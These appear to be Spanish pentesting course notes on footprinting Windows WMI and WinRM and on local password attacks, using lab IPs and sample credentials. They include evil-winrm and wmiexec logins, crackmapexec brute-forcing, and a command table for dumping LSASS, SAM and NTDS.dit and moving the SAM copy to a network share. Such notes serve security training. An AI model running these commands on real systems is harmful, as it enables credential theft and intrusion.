> Los servidores Windows pueden gestionarse localmente mediante las tareas de administración del Administrador del Servidor en servidores remotos. La administración remota está habilitada por defecto a partir de Windows Server 2016. Esta característica forma parte de las funciones de administración de hardware de Windows que gestionan el hardware del servidor de manera local y remota. Estas funciones incluyen un servicio que implementa el protocolo WS-Management, diagnóstico y control de hardware a través de controladores de gestión de placa base, así como una API COM y objetos de script que permiten escribir aplicaciones que se comunican de manera remota mediante el protocolo WS-Management.

Los principales componentes utilizados para la administración remota de Windows y servidores Windows son:

- **Remote Desktop Protocol (RDP)**
- **Windows Remote Management (WinRM)**
- **Windows Management Instrumentation (WMI)**

### WMI

**Windows Management Instrumentation (WMI)** es la implementación de Microsoft y también una extensión del **Common Information Model (CIM)**, que es la funcionalidad central del estándar **Web-Based Enterprise Management (WBEM)** para la plataforma Windows. WMI permite acceso de lectura y escritura a casi todas las configuraciones en sistemas Windows, lo que lo convierte en la interfaz más crítica en el entorno de Windows para la administración y mantenimiento remoto de computadoras, ya sean PCs o servidores. WMI se accede típicamente a través de **PowerShell**, **VBScript** o la **Windows Management Instrumentation Console (WMIC)**. WMI no es un solo programa, sino que consiste en varios programas y bases de datos, también conocidas como **repositorios**.

#### Footprinting a WMI

La **inicialización de la comunicación WMI** siempre ocurre en el **puerto TCP 135**, y después de establecerse la conexión de manera exitosa, la comunicación se mueve a un **puerto aleatorio**. Un ejemplo de herramienta que se puede usar para esto es el programa [wmiexec.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/wmiexec.py) del **Impacket toolkit**.

```shell-session
amr251@htb[/htb]$ /usr/share/doc/python3-impacket/examples/wmiexec.py Cry0l1t3:"P455w0rD!"@10.129.201.248 "hostname"

Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] SMBv3.0 dialect used
ILF-SQL-01
```
### WinRM - Administración remota de Windows

> **Windows Remote Management (WinRM)** es un protocolo de administración remota integrado en Windows, basado en la línea de comandos. WinRM utiliza el **Simple Object Access Protocol (SOAP)** para establecer conexiones con hosts remotos y sus aplicaciones. Debido a esto, WinRM debe ser habilitado y configurado explícitamente desde Windows 10. WinRM usa los puertos TCP 5985 y 5986 para la comunicación, siendo el puerto 5986 utilizado para **HTTPS**. Los puertos 80 y 443 fueron previamente usados para esta tarea, pero el puerto 80 se bloqueó por razones de seguridad, por lo que actualmente se utilizan los puertos 5985 y 5986. Con WinRM, es posible ejecutar comandos remotos en otro servidor.

Windows Remote Management (WinRM) es la implementación de Microsoft del protocolo de red **Web Services Management Protocol (WS-Management)**. Este protocolo está basado en servicios web XML y utiliza **SOAP (Simple Object Access Protocol)** para permitir la administración remota de sistemas Windows.

WinRM se encarga de la comunicación entre **WBEM (Web-Based Enterprise Management)** y **WMI (Windows Management Instrumentation)**, que a su vez puede invocar **DCOM (Distributed Component Object Model)**.

Por razones de seguridad, **WinRM debe ser activado y configurado manualmente** en Windows 10. Su uso depende mucho del entorno de seguridad en una red local o de dominio. Generalmente, se emplean **certificados** o mecanismos de **autenticación específicos** para reforzar su seguridad.

WinRM utiliza los puertos **TCP 5985 (HTTP)** y **5986 (HTTPS)**.

### Evil-WinRM

Esta herramienta nos permite comunicarnos con el servicio WinRM.

```shell-session
amr251@htb[/htb]$ evil-winrm -i 10.129.42.197 -u user -p password

Evil-WinRM shell v3.3

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\user\Documents>
```

Servicios como sesiones remotas usando **PowerShell** y la fusión de registros de eventos requieren WinRM. Este servicio está habilitado por defecto a partir de Windows Server 2012, pero debe ser configurado manualmente en versiones más antiguas de servidores y clientes, y es necesario crear las excepciones de firewall correspondientes.

### Footprinting WinRM

Ya sabemos que WinRM utiliza puertos TCP `5985` (`HTTP`) and `5986` (`HTTPS`) por defecto, que podemos escanear con nmap. Sin embargo, a veces veremos que solo HTTP se está utilizando en vez de HTTPS

```shell-session
amr251@htb[/htb]$ nmap -sV -sC 10.129.201.248 -p5985,5986 --disable-arp-ping -n
```

Si queremos saber si uno o más servidores remotos pueden ser alcanzados a través de **WinRM**, podemos hacerlo fácilmente con la ayuda de **PowerShell**. El cmdlet **Test-WsMan** es el encargado de esto, y se le pasa el nombre del host que queremos comprobar. En entornos basados en Linux, podemos usar la herramienta llamada **evil-winrm**, que es otra herramienta de pruebas de penetración diseñada para interactuar con **WinRM**.

```shell-session
amr251@htb[/htb]$ evil-winrm -i 10.129.201.248 -u Cry0l1t3 -p P455w0rD!

Evil-WinRM shell v3.3

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\Cry0l1t3\Documents>
```

### Usando crackmapexec

```shell-session
amr251@htb[/htb]$ crackmapexec winrm 10.129.42.197 -u user.list -p password.list

WINRM       10.129.42.197   5985   NONE             [*] None (name:10.129.42.197) (domain:None)
WINRM       10.129.42.197   5985   NONE             [*] http://10.129.42.197:5985/wsman
WINRM       10.129.42.197   5985   NONE             [+] None\user:password (Pwn3d!)
```

Como vemos arriba, el hecho de encontrar `Pwn3d!` indica que podremos ejecutar comandos a nivel de sistema si iniciamos sesión con el usuario por fuerza bruta.
### Ataques de contraseña en local

| **Comando**                                                                                              | **Descripción**                                                                                                                                                                                        |
| -------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| `tasklist /svc`                                                                                          | A command-line-based utility in Windows used to list running processes.                                                                                                                                |
| `findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml *.git *.ps1 *.yml`                          | Uses Windows command-line based utility findstr to search for the string "password" in many different file type.                                                                                       |
| `Get-Process lsass`                                                                                      | A Powershell cmdlet is used to display process information. Using this with the LSASS process can be helpful when attempting to dump LSASS process memory from the command line.                       |
| `rundll32 C:\windows\system32\comsvcs.dll, MiniDump 672 C:\lsass.dmp full`                               | Uses rundll32 in Windows to create a LSASS memory dump file. This file can then be transferred to an attack box to extract credentials.                                                                |
| `pypykatz lsa minidump /path/to/lsassdumpfile`                                                           | Uses Pypykatz to parse and attempt to extract credentials & password hashes from an LSASS process memory dump file.                                                                                    |
| `reg.exe save hklm\sam C:\sam.save`                                                                      | Uses reg.exe in Windows to save a copy of a registry hive at a specified location on the file system. It can be used to make copies of any registry hive (i.e., hklm\sam, hklm\security, hklm\system). |
| `move sam.save \\<ip>\NameofFileShare`                                                                   | Uses move in Windows to transfer a file to a specified file share over the network.                                                                                                                    |
| `python3 secretsdump.py -sam sam.save -security security.save -system system.save LOCAL`                 | Uses Secretsdump.py to dump password hashes from the SAM database.                                                                                                                                     |
| `vssadmin CREATE SHADOW /For=C:`                                                                         | Uses Windows command line based tool vssadmin to create a volume shadow copy for `C:`. This can be used to make a copy of NTDS.dit safely.                                                             |
| `cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\NTDS.dit c:\NTDS\NTDS.dit` | Uses Windows command line based tool copy to create a copy of NTDS.dit for a volume shadow copy of `C:`.                                                                                               |
Esta tabla contiene un breve resumen de algunos comandos importantes en Windows. Vamos a ver en detalle, por secciones, los ataques de contraseñas a Windows

### Atacando SAM

